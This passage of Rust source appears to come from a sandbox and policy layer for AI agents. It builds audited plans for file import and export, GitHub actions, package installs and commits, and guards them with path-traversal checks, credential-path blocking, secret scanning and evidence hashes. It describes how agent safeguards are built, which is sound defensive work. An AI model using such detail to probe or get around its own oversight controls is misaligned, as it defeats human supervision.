            paths,
            shadow_paths,
            auto_commit_shadow,
            verify_cmd,
            verify_timeout_ms,
            overwrite_binaries,
            skip_verify,
            shadow_evidence_hash,
            checkout_branch,
            create_branch,
            sync_mode,
            commit_message,
            trailers,
            tag,
            force_tag,
            push,
            force_push,
            remote,
            remote_url,
            push_branch,
            evidence_hash,
        };
        Ok((plan, target_resource, diffs, meta))
    }

    async fn prepare_fs_import_file_plan(
        &self,
        env: &AgentEnvironment,
        identity: &AgentIdentity,
        args: &Value,
    ) -> anyhow::Result<(ImportFilePlan, String, Vec<aos_core::FileDiffEntry>, Value)> {
        let raw_src = args
            .get("src_host_path")
            .and_then(|v| v.as_str())
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .context("Missing 'src_host_path'")?;
        if raw_src.contains('\0') {
            bail!("Invalid 'src_host_path' containing NUL byte");
        }
        let expanded = expand_home_tilde(raw_src);
        if !expanded.is_absolute() {
            bail!("'src_host_path' must be an absolute path (or ~/...): '{}'", raw_src);
        }
        if expanded
            .components()
            .any(|c| matches!(c, std::path::Component::ParentDir | std::path::Component::Prefix(_)))
        {
            bail!("Path traversal ('..') is forbidden in 'src_host_path': '{}'", raw_src);
        }
        let expanded_s = expanded.to_string_lossy().to_string();
        if AegisPolicyKernel::is_forbidden_import_source(raw_src)
            || AegisPolicyKernel::is_forbidden_import_source(&expanded_s)
        {
            bail!(
                "Blocked by Aegis OS policy: importing protected credential or dotenv secret '{}' is forbidden",
                raw_src
            );
        }

        let sym_meta = std::fs::symlink_metadata(&expanded)
            .with_context(|| format!("Host source file '{}' not found", expanded.display()))?;
        if sym_meta.file_type().is_symlink() {
            bail!(
                "Refusing to import trailing symlink '{}' from host",
                expanded.display()
            );
        }
        if !sym_meta.is_file() {
            bail!(
                "Host source '{}' is not a regular file",
                expanded.display()
            );
        }
        if sym_meta.len() > MAX_BINARY_EXPORT_BYTES {
            bail!(
                "Host source file '{}' ({} bytes) exceeds maximum import size ({} bytes)",
                expanded.display(),
                sym_meta.len(),
                MAX_BINARY_EXPORT_BYTES
            );
        }

        let canon_src = std::fs::canonicalize(&expanded)
            .with_context(|| format!("Canonicalizing host source '{}'", expanded.display()))?;
        let canon_src_s = canon_src.to_string_lossy().to_string();
        if AegisPolicyKernel::is_forbidden_import_source(&canon_src_s) {
            bail!(
                "Blocked by Aegis OS policy: canonical source '{}' is a protected credential/secret path",
                canon_src.display()
            );
        }
        let canon_rt = std::fs::canonicalize(&self.runtime_data_root)
            .unwrap_or_else(|_| self.runtime_data_root.clone());
        if canon_src.starts_with(&canon_rt) {
            bail!(
                "Blocked by Aegis OS Ring-0 policy: importing directly from Aegis runtime directory '{}' is forbidden",
                canon_src.display()
            );
        }

        let import_to = match args
            .get("import_to")
            .and_then(|v| v.as_str())
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .unwrap_or("imports")
        {
            s @ ("imports" | "shadow") => s.to_string(),
            other => bail!("Invalid 'import_to' '{}'; expected 'imports' or 'shadow'", other),
        };
        let overwrite = args
            .get("overwrite")
            .and_then(|v| v.as_bool())
            .unwrap_or(true);

        let default_name = canon_src
            .file_name()
            .and_then(|n| n.to_str())
            .filter(|n| !n.is_empty())
            .context("Host source path has no valid file name")?
            .to_string();
        let raw_dst = args
            .get("dst_path")
            .and_then(|v| v.as_str())
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .unwrap_or(&default_name);
        let rel_dst = shadow_relative(raw_dst)?;
        let clean_dst_rel = rel_dst.to_string_lossy().replace('\\', "/");

        let dst_full_path = if import_to == "shadow" {
            if AegisPolicyKernel::is_commit_poisoning_path(&clean_dst_rel) {
                bail!(
                    "Blocked by Aegis OS policy: cannot import external file directly onto sensitive build/hook path '{}'",
                    clean_dst_rel
                );
            }
            if let Some(msg) = self
                .claim_conflict_for_paths(identity, std::slice::from_ref(&clean_dst_rel))
                .await?
            {
                bail!("{}", msg);
            }
            let (_clean, full) = shadow_path_for_write(env.workspace.shadow_root(), &clean_dst_rel)?;
            full
        } else {
            env.sandbox.config().agent_home_dir.join("imports").join(&rel_dst)
        };

        if let Ok(dst_meta) = std::fs::symlink_metadata(&dst_full_path) {
            if dst_meta.file_type().is_symlink() || dst_meta.is_dir() {
                bail!(
                    "Import destination '{}' is a symlink or directory",
                    dst_full_path.display()
                );
            }
            if !overwrite {
                bail!(
                    "Import destination '{}' already exists and overwrite=false",
                    dst_full_path.display()
                );
            }
        }

        let bytes = tokio::fs::read(&canon_src).await?;
        if (bytes.len() as u64) > MAX_BINARY_EXPORT_BYTES {
            bail!(
                "Host source '{}' exceeded maximum import size while reading",
                canon_src.display()
            );
        }
        let src_sha256 = hex::encode(Sha256::digest(&bytes));
        let preview = match std::str::from_utf8(&bytes) {
            Ok(txt) => {
                let (scrubbed, _) = redact_dlp_secrets(txt);
                let snippet: String = scrubbed.lines().take(60).collect::<Vec<_>>().join("\n");
                let (capped, _) = truncate_utf8_bytes(&snippet, 8 * 1024);
                format!(
                    "Authorized Host Import ({} bytes, sha256:{})\n{}",
                    bytes.len(),
                    &src_sha256[..16],
                    capped
                )
            }
            Err(_) => format!(
                "Authorized Host Binary Import -> {} ({} bytes, sha256:{})",
                clean_dst_rel,
                bytes.len(),
                &src_sha256[..16]
            ),
        };

        let canonical_plan = serde_json::to_vec(&json!({
            "src_host_path": canon_src.display().to_string(),
            "src_sha256": src_sha256,
            "size_bytes": bytes.len(),
            "import_to": import_to,
            "dst_path": clean_dst_rel,
            "overwrite": overwrite,
        }))?;
        let evidence_hash = hex::encode(Sha256::digest(&canonical_plan));

        let diff_entry = aos_core::FileDiffEntry {
            relative_path: format!("{import_to}:{clean_dst_rel}"),
            change_type: if dst_full_path.exists() {
                DiffChangeType::Modified
            } else {
                DiffChangeType::Added
            },
            old_size: None,
            new_size: Some(bytes.len() as u64),
            preview_diff: Some(preview),
            old_sha256: Some(format!("sha256:{src_sha256}")),
            new_sha256: Some(format!("sha256:{src_sha256}")),
        };

        let target_resource = canon_src.display().to_string();
        let meta = json!({
            "src_host_path": target_resource,
            "src_sha256": src_sha256,
            "size_bytes": bytes.len(),
            "import_to": import_to,
            "dst_path": clean_dst_rel,
            "overwrite": overwrite,
            "evidence_hash": evidence_hash,
            "evidence": {
                "src_host_path": target_resource,
                "src_sha256": src_sha256,
                "size_bytes": bytes.len(),
                "import_to": import_to,
                "dst_path": clean_dst_rel,
                "overwrite": overwrite,
                "evidence_hash": evidence_hash,
            },
        });
        let plan = ImportFilePlan {
            canon_src,
            src_sha256,
            import_to,
            clean_dst_rel,
            dst_full_path,
            evidence_hash,
        };
        Ok((plan, target_resource, vec![diff_entry], meta))
    }

    fn prepare_github_inspect_context(
        host_root: &Path,
        args: &Value,
    ) -> anyhow::Result<(String, Value)> {
        let origin_repo = detect_github_repo_from_git_config(host_root);
        let explicit_repo = args
            .get("repo")
            .and_then(|v| v.as_str())
            .map(str::trim)
            .filter(|s| !s.is_empty());
        let effective_repo = resolve_github_repo_arg(host_root, args)?;
        let cross_repo = match (&origin_repo, explicit_repo) {
            (Some(orig), None) => {
                let _ = orig;
                false
            }
            (Some(orig), Some(req)) => !orig.eq_ignore_ascii_case(req),
            (None, _) => true,
        };
        let evidence_hash = hex::encode(Sha256::digest(
            serde_json::to_vec(&json!({
                "repo": effective_repo,
                "origin_repo": origin_repo,
                "cross_repo": cross_repo,
            }))?
        ));
        let meta = json!({
            "repo": effective_repo,
            "origin_repo": origin_repo,
            "cross_repo": cross_repo,
            "evidence_hash": evidence_hash,
        });
        Ok((effective_repo, meta))
    }

    fn prepare_github_ci_rerun_plan(
        host_root: &Path,
        args: &Value,
    ) -> anyhow::Result<(GitHubCiRerunPlan, String, Value)> {
        let repo = resolve_github_repo_arg(host_root, args)?;
        let run_id = args
            .get("run_id")
            .and_then(|v| v.as_u64())
            .filter(|&id| id > 0)
            .context("Missing positive integer 'run_id' for github_ci_rerun")?;
        let failed_only = args
            .get("failed_only")
            .and_then(|v| v.as_bool())
            .unwrap_or(true);
        let job_id = args.get("job_id").and_then(|v| v.as_u64()).filter(|&id| id > 0);
        let canonical = serde_json::to_vec(&json!({
            "repo": repo,
            "run_id": run_id,
            "failed_only": failed_only,
            "job_id": job_id,
        }))?;
        let evidence_hash = hex::encode(Sha256::digest(&canonical));
        let resource = format!("{repo}#run:{run_id}");
        let meta = json!({
            "repo": repo,
            "run_id": run_id,
            "failed_only": failed_only,
            "job_id": job_id,
            "evidence_hash": evidence_hash,
            "evidence": {
                "repo": repo,
                "run_id": run_id,
                "failed_only": failed_only,
                "job_id": job_id,
                "evidence_hash": evidence_hash,
            },
        });
        let plan = GitHubCiRerunPlan {
            repo,
            run_id,
            failed_only,
            job_id,
            evidence_hash,
        };
        Ok((plan, resource, meta))
    }

    fn prepare_github_pr_create_plan(
        host_root: &Path,
        args: &Value,
    ) -> anyhow::Result<(GitHubPrCreatePlan, String, Vec<aos_core::FileDiffEntry>, Value)> {
        let repo = resolve_github_repo_arg(host_root, args)?;
        let title = args
            .get("title")
            .and_then(|v| v.as_str())
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .context("Missing non-empty 'title' for github_pr_create")?
            .to_string();
        if title.contains('\0') || title.len() > 256 {
            bail!("Invalid PR 'title' length or NUL byte");
        }
        let body = args
            .get("body")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        if body.contains('\0') || body.len() > 32 * 1024 {
            bail!("Invalid PR 'body' (exceeds 32 KB limit or contains NUL byte)");
        }
        ensure_no_dlp_secrets(&[&title, &body], "PR title/body")?;

        let base = match args
            .get("base")
            .and_then(|v| v.as_str())
            .map(str::trim)
            .filter(|s| !s.is_empty())
        {
            Some(b) => {
                if !is_valid_ci_branch_name(b) {
                    bail!("Invalid base branch name '{}'", b);
                }
                Some(b.to_string())
            }
            None => None,
        };
        let head = match args
            .get("head")
            .and_then(|v| v.as_str())
            .map(str::trim)
            .filter(|s| !s.is_empty())
        {
            Some(h) => {
                if !is_valid_ci_branch_name(h) {
                    bail!("Invalid head branch name '{}'", h);
                }
                Some(h.to_string())
            }
            None => None,
        };
        let draft = args.get("draft").and_then(|v| v.as_bool()).unwrap_or(false);

        let canonical = serde_json::to_vec(&json!({
            "repo": repo,
            "title": title,
            "body": body,
            "base": base,
            "head": head,
            "draft": draft,
        }))?;
        let evidence_hash = hex::encode(Sha256::digest(&canonical));
        let resource = format!(
            "{}:{}=>{}",
            repo,
            head.as_deref().unwrap_or("HEAD"),
            base.as_deref().unwrap_or("default")
        );
        let preview_diff = aos_core::FileDiffEntry {
            relative_path: ".github/PULL_REQUEST_PLAN".to_string(),
            change_type: DiffChangeType::Added,
            old_size: None,
            new_size: Some((title.len() + body.len()) as u64),
            preview_diff: Some(format!(
                "+Repo:  {}\n+Head:  {}\n+Base:  {}\n+Draft: {}\n+Title: {}\n\n{}",
                repo,
                head.as_deref().unwrap_or("<current>"),
                base.as_deref().unwrap_or("<default>"),
                draft,
                title,
                body
            )),
            old_sha256: None,
            new_sha256: Some(format!("sha256:{}", evidence_hash)),
        };
        let meta = json!({
            "repo": repo,
            "title": title,
            "base": base,
            "head": head,
            "draft": draft,
            "evidence_hash": evidence_hash,
            "evidence": {
                "repo": repo,
                "title": title,
                "base": base,
                "head": head,
                "draft": draft,
                "evidence_hash": evidence_hash,
            },
        });
        let plan = GitHubPrCreatePlan {
            repo,
            title,
            body,
            base,
            head,
            draft,
            evidence_hash,
        };
        Ok((plan, resource, vec![preview_diff], meta))
    }

    fn prepare_github_comment_create_plan(
        host_root: &Path,
        args: &Value,
    ) -> anyhow::Result<(GitHubCommentCreatePlan, String, Vec<aos_core::FileDiffEntry>, Value)> {
        let repo = resolve_github_repo_arg(host_root, args)?;
        let number = args
            .get("number")
            .and_then(|v| v.as_u64())
            .filter(|&n| n > 0)
            .context("Missing positive integer 'number' (PR or Issue number) for github_comment_create")?;
        let body = args
            .get("body")
            .and_then(|v| v.as_str())
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .context("Missing non-empty 'body' for github_comment_create")?
            .to_string();
        if body.contains('\0') || body.len() > 32 * 1024 {
            bail!("Invalid comment 'body' (exceeds 32 KB limit or contains NUL byte)");
        }
        ensure_no_dlp_secrets(&[&body], "comment body")?;

        let canonical = serde_json::to_vec(&json!({
            "repo": repo,
            "number": number,
            "body": body,
        }))?;
        let evidence_hash = hex::encode(Sha256::digest(&canonical));
        let resource = format!("{repo}#comment:{number}");
        let preview_diff = aos_core::FileDiffEntry {
            relative_path: ".github/COMMENT_PLAN".to_string(),
            change_type: DiffChangeType::Added,
            old_size: None,
            new_size: Some(body.len() as u64),
            preview_diff: Some(format!("+Repo:   {}\n+Number: #{}\n\n{}", repo, number, body)),
            old_sha256: None,
            new_sha256: Some(format!("sha256:{}", evidence_hash)),
        };
        let meta = json!({
            "repo": repo,
            "number": number,
            "body": body,
            "evidence_hash": evidence_hash,
            "evidence": {
                "repo": repo,
                "number": number,
                "body_len": body.len(),
                "evidence_hash": evidence_hash,
            },
        });
        let plan = GitHubCommentCreatePlan {
            repo,
            number,
            body,
            evidence_hash,
        };
        Ok((plan, resource, vec![preview_diff], meta))
    }

    fn prepare_github_pr_merge_plan(
        host_root: &Path,
        args: &Value,
    ) -> anyhow::Result<(GitHubPrMergePlan, String, Vec<aos_core::FileDiffEntry>, Value)> {
        let repo = resolve_github_repo_arg(host_root, args)?;
        let pr_number = args
            .get("pr_number")
            .and_then(|v| v.as_u64())
            .filter(|&n| n > 0)
            .context("Missing positive integer 'pr_number' for github_pr_merge")?;
        let method = match args
            .get("method")
            .and_then(|v| v.as_str())
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .unwrap_or("squash")
        {
            s @ ("merge" | "squash" | "rebase") => s.to_string(),
            other => bail!("Invalid merge 'method' '{}'; expected merge|squash|rebase", other),
        };
        let delete_branch = args
            .get("delete_branch")
            .and_then(|v| v.as_bool())
            .unwrap_or(false);
        let subject = args
            .get("subject")
            .and_then(|v| v.as_str())
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .map(str::to_string);
        if let Some(ref s) = subject {
            if s.contains('\0') || s.len() > 256 {
                bail!("Invalid PR merge 'subject' (exceeds 256 bytes or contains NUL byte)");
            }
            ensure_no_dlp_secrets(&[s], "PR merge subject")?;
        }
        let body = args
            .get("body")
            .and_then(|v| v.as_str())
            .map(str::to_string)
            .filter(|s| !s.trim().is_empty());
        if let Some(ref b) = body {
            if b.contains('\0') || b.len() > 16 * 1024 {
                bail!("Invalid PR merge 'body' (exceeds 16 KB limit or contains NUL byte)");
            }
            ensure_no_dlp_secrets(&[b], "PR merge body")?;
        }

        let canonical = serde_json::to_vec(&json!({
            "repo": repo,
            "pr_number": pr_number,
            "method": method,
            "delete_branch": delete_branch,
            "subject": subject,
            "body": body,
        }))?;
        let evidence_hash = hex::encode(Sha256::digest(&canonical));
        let resource = format!("{repo}#pr:{pr_number}:merge");
        let preview_diff = aos_core::FileDiffEntry {
            relative_path: ".github/PR_MERGE_PLAN".to_string(),
            change_type: DiffChangeType::Added,
            old_size: None,
            new_size: Some(canonical.len() as u64),
            preview_diff: Some(format!(
                "+Repo:          {}\n+PR Number:     #{}\n+Method:        {}\n+Delete Branch: {}\n+Subject:       {}\n\n{}",
                repo,
                pr_number,
                method,
                delete_branch,
                subject.as_deref().unwrap_or("<default>"),
                body.as_deref().unwrap_or("")
            )),
            old_sha256: None,
            new_sha256: Some(format!("sha256:{}", evidence_hash)),
        };
        let meta = json!({
            "repo": repo,
            "pr_number": pr_number,
            "method": method,
            "delete_branch": delete_branch,
            "subject": subject,
            "body": body,
            "evidence_hash": evidence_hash,
            "evidence": {
                "repo": repo,
                "pr_number": pr_number,
                "method": method,
                "delete_branch": delete_branch,
                "subject": subject,
                "evidence_hash": evidence_hash,
            },
        });
        let plan = GitHubPrMergePlan {
            repo,
            pr_number,
            method,
            delete_branch,
            subject,
            body,
            evidence_hash,
        };
        Ok((plan, resource, vec![preview_diff], meta))
    }

    fn prepare_pkg_install_plan(
        env: &AgentEnvironment,
        args: &Value,
    ) -> anyhow::Result<(PkgInstallPlan, String, Vec<aos_core::FileDiffEntry>, Value)> {
        let manager = args
            .get("manager")
            .and_then(|v| v.as_str())
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .context("Missing 'manager' (expected npm, pnpm, yarn, bun, pip, uv, cargo, or go)")?
            .to_ascii_lowercase();
        let registry_slice = aos_egress::registry_domains_for_ecosystem(&manager)
            .filter(|_| matches!(manager.as_str(), "npm" | "pnpm" | "yarn" | "bun" | "pip" | "uv" | "cargo" | "go"))
            .with_context(|| {
                format!(
                    "Unsupported package manager '{}'; expected npm, pnpm, yarn, bun, pip, uv, cargo, or go",
                    manager
                )
            })?;
        let registry_domains: Vec<String> = registry_slice.iter().map(|s| (*s).to_string()).collect();

        let raw_packages: Vec<String> = match args.get("packages") {
            Some(v) if !v.is_null() => serde_json::from_value(v.clone())
                .context("'packages' must be an array of strings")?,
            _ => Vec::new(),
        };
        if raw_packages.len() > 64 {
            bail!("Too many package specs ({}); maximum is 64 per call", raw_packages.len());
        }
        for spec in &raw_packages {
            if !is_safe_package_spec(spec) {
                bail!(
                    "Invalid or unsafe package specifier '{}': flags, shell metacharacters, path traversal, and custom URLs are forbidden",
                    spec
                );
            }
            if manager == "go" {
                let first_seg = spec
                    .split('@')
                    .next()
                    .unwrap_or(spec)
                    .split('/')
                    .next()
                    .unwrap_or("");
                if first_seg.is_empty() || !first_seg.contains('.') {
                    bail!(
                        "Invalid Go module specifier '{}': must begin with a qualified domain module path (e.g. github.com/pkg/errors@v0.9.1)",
                        spec
                    );
                }
            }
        }

        let shadow_root = env.workspace.shadow_root().to_path_buf();
        let raw_cwd = args
            .get("cwd")
            .and_then(|v| v.as_str())
            .map(str::trim)
            .unwrap_or(".");
        let (cwd_rel, target_dir) = if raw_cwd.is_empty() || raw_cwd == "." || raw_cwd == "/" {
            (".".to_string(), shadow_root.clone())
        } else {
            let rel_path = shadow_relative(raw_cwd)?;
            let mut cur = shadow_root.clone();
            for comp in rel_path.components() {
                let std::path::Component::Normal(seg) = comp else {
                    bail!("Invalid 'cwd' path component '{}'", raw_cwd);
                };
                cur.push(seg);
                let meta = std::fs::symlink_metadata(&cur)
                    .with_context(|| format!("Package cwd '{}' not found in CoW shadow", cur.display()))?;
                if meta.file_type().is_symlink() || !meta.is_dir() {
                    bail!(
                        "Refusing pkg_install cwd through symlink or non-directory '{}'",
                        cur.display()
                    );
                }
            }
            (rel_path.to_string_lossy().replace('\\', "/"), cur)
        };

        let dev = args.get("dev").and_then(|v| v.as_bool()).unwrap_or(false);
        let allow_scripts = args
            .get("allow_scripts")
            .and_then(|v| v.as_bool())
            .unwrap_or(false);
        let offline = args.get("offline").and_then(|v| v.as_bool()).unwrap_or(false);
        let timeout_ms = args
            .get("timeout_ms")
            .and_then(|v| v.as_u64())
            .unwrap_or(180_000)
            .clamp(1_000, 600_000);

        let pre_manifest_hashes = hash_pkg_manifests(&target_dir)?;
        let canonical = serde_json::to_vec(&json!({
            "manager": manager,
            "cwd_rel": cwd_rel,
            "packages": raw_packages,
            "dev": dev,
            "allow_scripts": allow_scripts,
            "offline": offline,
            "pre_manifest_hashes": pre_manifest_hashes,
        }))?;
        let evidence_hash = hex::encode(Sha256::digest(&canonical));

        let pkg_label = if raw_packages.is_empty() {
            "manifest".to_string()
        } else {
            raw_packages.join("+")
        };
        let resource = format!("pkg:{}:{}#{}", manager, cwd_rel, pkg_label);
        let registry_label = if offline {
            "<offline>".to_string()
        } else {
            registry_domains.join(", ")
        };
        let preview_diff = aos_core::FileDiffEntry {
            relative_path: ".aegis/PKG_INSTALL_PLAN".to_string(),
            change_type: DiffChangeType::Added,
            old_size: None,
            new_size: Some(canonical.len() as u64),
            preview_diff: Some(format!(
                "+Manager:       {}\n+Cwd (shadow):  {}\n+Packages:      {}\n+Dev:           {}\n+Allow Scripts: {}\n+Offline:       {}\n+Registries:    {}",
                manager,
                cwd_rel,
                if raw_packages.is_empty() { "<from lockfile/manifest>".to_string() } else { raw_packages.join(" ") },
                dev,
                allow_scripts,
                offline,
                registry_label
            )),
            old_sha256: None,
            new_sha256: Some(format!("sha256:{}", evidence_hash)),
        };
        let registries_val = if offline {
            Vec::<String>::new()
        } else {
            registry_domains.clone()
        };
        let meta = json!({
            "manager": manager,
            "cwd": cwd_rel,
            "packages": raw_packages,
            "dev": dev,
            "allow_scripts": allow_scripts,
            "offline": offline,
            "registry_domains": registries_val,
            "evidence_hash": evidence_hash,
            "evidence": {
                "manager": manager,
                "cwd": cwd_rel,
                "packages": raw_packages,
                "dev": dev,
                "allow_scripts": allow_scripts,
                "offline": offline,
                "registry_domains": registries_val,
                "evidence_hash": evidence_hash,
            },
        });
        let sbx_cfg = env.sandbox.config();
        let plan = PkgInstallPlan {
            manager,
            packages: raw_packages,
            cwd_rel,
            target_dir,
            shadow_root,
            host_root: env.workspace.host_source_root().to_path_buf(),
            agent_home_dir: sbx_cfg.agent_home_dir.clone(),
            org_shared_ro_dir: sbx_cfg.org_shared_ro_dir.clone(),
            org_agent_pub_dir: sbx_cfg.org_agent_pub_dir.clone(),
            dev,
            allow_scripts,
            offline,
            timeout_ms,
            registry_domains,
            pre_manifest_hashes,
            evidence_hash,
        };
        Ok((plan, resource, vec![preview_diff], meta))
    }

    pub async fn call_tool(
        &self,
        identity: &AgentIdentity,
        tool_name: &str,
        args: Value,
    ) -> anyhow::Result<Value> {
        if tool_name == "memory_policy_evaluate" {
            return self.memory_policy_evaluate(identity, args).await;
        }

        let key = Self::agent_key(&identity.org_id, &identity.agent_id);
        let env = self
            .agents
            .read()
            .await
            .get(&key)
            .cloned()
            .with_context(|| format!("Agent environment '{}' is not initialized", key))?;

        if tool_name == "workspace_commit" {
            let _ = env.workspace.refresh_from_host().await;
        }

        let mut target_org = args
            .get("target_org_id")
            .and_then(|v| v.as_str())
            .unwrap_or(&identity.org_id)
            .to_string();
        let mut target_resource = args
            .get("path")
            .or_else(|| args.get("dst_host_path"))
            .or_else(|| args.get("target_domain"))
            .or_else(|| args.get("to_agent"))
            .or_else(|| args.get("topic"))
            .or_else(|| args.get("uri"))
            .or_else(|| args.get("name"))
            .and_then(|v| v.as_str())
            .unwrap_or("/workspace")
            .to_string();

        let mut audit_metadata = args.clone();
        let mut pre_commit_diffs: Option<Vec<aos_core::FileDiffEntry>> = None;
        let mut pre_commit_evidence_hash: Option<String> = None;
        let mut pre_export_plan: Option<(
            PathBuf,
            Vec<u8>,
            &'static str,
            String,
            String,
            String,
            Option<PathBuf>,
        )> = None;
        let mut pre_switch_plan: Option<(PathBuf, String, Option<PathBuf>)> = None;
        let mut pre_git_plan: Option<HostGitPlan> = None;
        let mut pre_import_plan: Option<ImportFilePlan> = None;
        let mut pre_ci_rerun_plan: Option<GitHubCiRerunPlan> = None;
        let mut pre_pr_create_plan: Option<GitHubPrCreatePlan> = None;
        let mut pre_comment_create_plan: Option<GitHubCommentCreatePlan> = None;
        let mut pre_pr_merge_plan: Option<GitHubPrMergePlan> = None;
        let mut pre_pkg_install_plan: Option<PkgInstallPlan> = None;
        if tool_name == "workspace_commit" {
            let filter_paths: Option<Vec<String>> = args
                .get("paths")
                .and_then(|v| serde_json::from_value(v.clone()).ok());
            let overwrite_binaries = args
                .get("overwrite_binaries")
                .and_then(|v| v.as_bool())
                .unwrap_or(false);
            let skip_verify = args
                .get("skip_verify")
                .and_then(|v| v.as_bool())
                .unwrap_or(false);
            let host_verify_cfg: Option<serde_json::Value> = std::fs::read(
                env.workspace.host_source_root().join(".aegis/verify.json"),
            )
            .ok()
            .and_then(|bytes| serde_json::from_slice(&bytes).ok());
            let configured_verify_cmd = std::env::var("AOS_VERIFY_CMD")
                .ok()
                .map(|s| s.trim().to_string())
                .filter(|s| !s.is_empty())
                .or_else(|| {
                    host_verify_cfg
                        .as_ref()
                        .and_then(|cfg| cfg.get("verify_cmd"))
                        .and_then(|v| v.as_str())
                        .map(|s| s.trim().to_string())
                        .filter(|s| !s.is_empty())
                });
            if let Ok(mut touched) = env.workspace.changed_since_baseline().await {
                if let Some(ref allow) = filter_paths {
                    touched.retain(|p| allow.contains(p));
                }
                // Check peer file claims BEFORE policy evaluation so a claim conflict fails fast
                // without minting a spurious escalation ticket or burning a One-Shot lease.
                if let Some(msg) = self.claim_conflict_for_paths(identity, &touched).await? {
                    bail!("{}", msg);
                }
                let base_dir = env
                    .workspace
                    .shadow_root()
                    .parent()
                    .map(|p| p.join("baseline_snapshot"))
                    .filter(|p| p.exists())
                    .unwrap_or_else(|| env.workspace.host_source_root().to_path_buf());
                let diffs = CoWWorkspace::diff_dirs(
                    &base_dir,
                    env.workspace.shadow_root(),
                    filter_paths.as_deref(),
                )
                .await
                .unwrap_or_default();
                let (_canonical_diff_payload, evidence_hash) =
                    aos_core::compute_diff_evidence(&diffs, overwrite_binaries, skip_verify);
                if let Some(obj) = audit_metadata.as_object_mut() {
                    obj.insert("paths".to_string(), json!(touched));
                    obj.insert(
                        "host_root".to_string(),
                        json!(env.workspace.host_source_root().display().to_string()),
                    );
                    obj.insert("overwrite_binaries".to_string(), json!(overwrite_binaries));
                    obj.insert("skip_verify".to_string(), json!(skip_verify));
                    obj.insert(
                        "has_configured_verify_cmd".to_string(),
                        json!(configured_verify_cmd.is_some()),
                    );
                    obj.insert("evidence_hash".to_string(), json!(evidence_hash));
                    obj.insert(
                        "evidence".to_string(),
                        json!({
                            "changed_files_count": diffs.len(),
                            "paths": touched,
                            "evidence_hash": evidence_hash,
                            "overwrite_binaries": overwrite_binaries,
                            "skip_verify": skip_verify,
                            "configured_verify_cmd": configured_verify_cmd,
                        }),
                    );
                }
                pre_commit_diffs = Some(diffs);
                pre_commit_evidence_hash = Some(evidence_hash);
            }
        } else if tool_name == "fs_export_file" {
            let src_path = args
                .get("src_path")
                .and_then(|v| v.as_str())
                .map(str::trim)
                .filter(|s| !s.is_empty())
                .context("Missing 'src_path'")?;
            let dst_host_path = args
                .get("dst_host_path")
                .and_then(|v| v.as_str())
                .map(str::trim)
                .filter(|s| !s.is_empty())
                .context("Missing 'dst_host_path'")?;
            let overwrite = args
                .get("overwrite")
                .and_then(|v| v.as_bool())
                .unwrap_or(true);

            let bytes = if src_path.starts_with("artifact://") {
                let (_meta, b) = self.org_storage.fetch_artifact(identity, src_path).await?;
                b
            } else {
                let (_resolved, b) = read_sandbox_file_bytes_no_symlink(
                    env.workspace.shadow_root(),
                    &env.sandbox.config().agent_home_dir,
                    &env.sandbox.config().org_agent_pub_dir,
                    src_path,
                )?;
                b
            };

            let (canon_dst, mime_type) =
                validate_export_payload_and_dest(dst_host_path, &bytes, overwrite)?;
            let canon_rt = std::fs::canonicalize(&self.runtime_data_root)
                .unwrap_or_else(|_| self.runtime_data_root.clone());
            if canon_dst.starts_with(&canon_rt) {
                bail!(
                    "Blocked by Aegis OS Ring-0 policy: exporting into Aegis runtime state directory '{}' is forbidden",
                    canon_dst.display()
                );
            }

            if let Some(rel) =
                strip_root_matching_macos_private(&canon_dst, env.workspace.host_source_root())
            {
                let rel_s = rel.to_string_lossy().replace('\\', "/");
                if !rel_s.is_empty() {
                    if let Some(msg) = self.claim_conflict_for_paths(identity, &[rel_s]).await? {
                        bail!("{}", msg);
                    }
                }
            }

            self.ensure_org_vault(&identity.org_id).await?;
            let file_name = canon_dst
                .file_name()
                .and_then(|n| n.to_str())
                .unwrap_or("export.bin");
            let artifact_meta = self
                .org_storage
                .publish_artifact(
                    identity,
                    file_name,
                    &bytes,
                    mime_type,
                    json!({
                        "export_src": src_path,
                        "export_dst": canon_dst.display().to_string(),
                    }),
                )
                .await?;

            let (change_type, old_size, old_sha256) = if canon_dst.is_file() {
                let old_bytes = tokio::fs::read(&canon_dst).await.unwrap_or_default();
                let mut h = Sha256::new();
                h.update(&old_bytes);
                (
                    DiffChangeType::Modified,
                    Some(old_bytes.len() as u64),
                    Some(format!("sha256:{}", hex::encode(h.finalize()))),
                )
            } else {
                (DiffChangeType::Added, None, None)
            };
            let short_sha = &artifact_meta.sha256[..artifact_meta.sha256.len().min(16)];
            let diff_entry = aos_core::FileDiffEntry {
                relative_path: canon_dst.display().to_string(),
                change_type,
                old_size,
                new_size: Some(bytes.len() as u64),
                preview_diff: Some(format!(
                    "Zero-Copy Artifact Export -> {} ({} bytes, {}, sha256:{})",
                    canon_dst.display(),
                    bytes.len(),
                    mime_type,
                    short_sha
                )),
                old_sha256,
                new_sha256: Some(format!("sha256:{}", artifact_meta.sha256)),
            };
            let (_payload, evidence_hash) =
                aos_core::compute_diff_evidence(std::slice::from_ref(&diff_entry), overwrite, false);
            target_resource = canon_dst.display().to_string();
            if let Some(obj) = audit_metadata.as_object_mut() {
                obj.insert("src_path".to_string(), json!(src_path));
                obj.insert("dst_host_path".to_string(), json!(target_resource.clone()));
                obj.insert("overwrite".to_string(), json!(overwrite));
                obj.insert("size_bytes".to_string(), json!(bytes.len()));
                obj.insert("content_type".to_string(), json!(mime_type));
                obj.insert("sha256".to_string(), json!(artifact_meta.sha256.clone()));
                obj.insert("artifact_uri".to_string(), json!(artifact_meta.uri.clone()));
                obj.insert("evidence_hash".to_string(), json!(evidence_hash.clone()));
                obj.insert(
                    "evidence".to_string(),
                    json!({
                        "changed_files_count": 1,
                        "paths": [target_resource.clone()],
                        "evidence_hash": evidence_hash.clone(),
                        "artifact_uri": artifact_meta.uri.clone(),
                        "sha256": artifact_meta.sha256.clone(),
                        "size_bytes": bytes.len(),
                        "content_type": mime_type,
                    }),
                );
            }
            let cas_blob_path = self
                .runtime_data_root
                .join("orgs")
                .join(&identity.org_id)
                .join("cas")
                .join(&artifact_meta.sha256);
